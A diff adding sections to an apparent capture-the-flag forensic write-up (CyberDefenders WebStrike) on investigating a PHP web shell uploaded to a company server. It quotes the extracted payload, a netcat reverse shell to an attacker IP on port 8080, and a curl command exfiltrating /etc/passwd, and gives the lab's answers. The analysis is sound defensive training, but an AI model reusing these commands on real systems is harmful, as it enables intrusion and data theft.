@@ -84,4 +84,39 @@ A suspicious file was discovered on a company web server. The Development team f
 - Followed this redirect, `image.jpg.php` was accessible at that path
 - The website stores uploaded files in the `/reviews/uploads/` directory
 - **Answer** - `/reviews/uploads/`
+---
+
+### 5. Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?
+
+- Extracted PHP payload:
+  ```php
+  <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
+- Indicates outbound connection to attacker on port 8080
+- **Answer** 8080
+---
+
+### 6. Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?
+
+- Used Wireshark filter:
+  ```wireshark
+  tcp.port == 8080 and ip.src == 24.49.63.79
+- Found `curl -X POST -d /etc/passwd http://117.11.88.124:443/` in the TCP stream
+- The attacker was attempting to exfiltrate `/etc/passwd`
+- **Answer** - `passwd`
+---
+
+## Lessons Learned
+
+- Importance of proper file validation on upload endpoints
+- How attackers use filename obfuscation to bypass filters
+- Value of network traffic inspection during incident response
+- How reverse shells exploit outbound connections
+- Role of User-Agent and IP analysis in filtering and threat intel
+---
+
+## References
+
+- [CyberDefenders – WebStrike Lab](https://cyberdefenders.org/labs/71)
+- [Wireshark](https://www.wireshark.org/)
+- [ipgeolocation.io](https://ipgeolocation.io/)
 
